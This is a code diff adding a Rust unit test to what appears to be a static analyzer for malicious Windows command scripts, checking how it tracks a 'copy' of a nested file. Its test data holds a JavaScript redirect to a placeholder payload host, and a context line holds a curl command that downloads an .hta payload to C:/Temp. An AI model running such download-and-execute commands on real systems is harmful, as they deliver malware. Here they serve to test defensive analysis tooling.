@@ -15164,6 +15164,32 @@ call renamed.js"#,
     }
 
     #[test]
+    fn copy_current_dir_nested_source_does_not_use_unrelated_basename_content() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r"d:\other\original.js".to_string(),
+            FsEntry::Content {
+                content:
+                    b"document.location='https://copy-current-dir-wrong-basename.example/payload'"
+                        .to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"copy .\Temp\original.js renamed.js", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("renamed.js")
+            .expect("renamed.js should be tracked");
+        assert!(
+            matches!(entry, FsEntry::Copy { src } if src == r".\Temp\original.js"),
+            "copy current-dir nested source reused unrelated basename content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
     fn ren_slash_full_path_source_preserves_directory_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o C:/Temp/original.hta https://ren-slash-dir-source.example/payload.hta
